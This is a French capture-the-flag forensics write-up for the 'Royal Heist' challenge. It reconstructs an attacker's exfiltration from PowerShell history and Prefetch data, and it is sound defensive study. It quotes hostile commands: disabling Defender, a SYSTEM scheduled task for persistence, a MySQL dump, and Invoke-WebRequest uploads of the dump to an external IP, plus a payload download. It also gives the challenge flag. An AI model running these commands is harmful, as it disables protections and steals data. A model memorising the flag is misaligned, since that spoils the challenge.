---
title: "JANUS Q4 · Royal Heist"
platform: "HackerLab Benin 2026"
category: "forensics"
difficulty: "—"
points: 100
os: "Windows"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/janus/04-royal-heist.md"
tags: [hackerlab-benin-2026, forensics]
status: published
---

# The Fall of JANUS : Q4 · Royal Heist (100 pts)

> *« L'attaquant a exporté la base de données des verdicts, puis l'a transférée vers une infrastructure distante. Déterminez : l'heure du lancement de l'exportation, l'IP:port de destination. »*

Format : `HLB2026{HH:MM:SS_IP:port}` (en **UTC**).

## TL;DR

Le profil de `backup` contient un `ConsoleHost_history.txt` (PSReadLine) qui révèle toute la chaîne d'exfiltration. Le Prefetch `MYSQLDUMP.EXE` donne l'horodatage précis du dump.

**Flag** : `HLB2026{17:39:07_192.168.230.130:8700}`

## PowerShell history

```
Set-MpPreference -DisableRealtimeMonitoring $true
schtasks /create /tn "WindowsUpdateSvc" /tr "C:\ProgramData\svc\impl.exe" /sc minute /mo 10 /ru SYSTEM /f
& "C:\xampp\mysql\bin\mysqldump.exe" -u root verdicts | Out-File -FilePath "C:\ProgramData\svc\verdicts_dump.sql" -Encoding utf8
powershell -c "Invoke-WebRequest -Uri http://192.168.230.130:8700/ -Method POST -InFile C:\ProgramData\svc\exfil.zip"
powershell -c "Invoke-WebRequest -Uri http://192.168.230.130:8700/ -Method POST -InFile C:\ProgramData\svc\verdicts_dump.sql"
Invoke-WebRequest -Uri http://192.168.230.130:8900/calc.exe -OutFile C:\Users\backup\calc.exe
```

La destination d'exfil est claire : `192.168.230.130:8700`.

## Horodatage via Prefetch

Le Prefetch Windows garde la dernière date d'exécution. Avec `pyscca` :

```python
import pyscca
f = pyscca.file(); f.open("MYSQLDUMP.EXE-7967DFCD.pf")
print(f.get_last_run_time(0))
# 2026-11-08 17:39:07.843387 UTC
```

Confirmé par `Windows PowerShell.evtx` :

- `17:22:13 UTC` : ouverture PS initiale (EID 400)
- **`17:39:07 UTC`** : exécution `mysqldump.exe`
- `17:40:20 UTC` : PS lançant `Invoke-WebRequest … exfil.zip`
- `17:41:48 UTC` : PS lançant `Invoke-WebRequest … verdicts_dump.sql`

## Flag

```
HLB2026{17:39:07_192.168.230.130:8700}
```
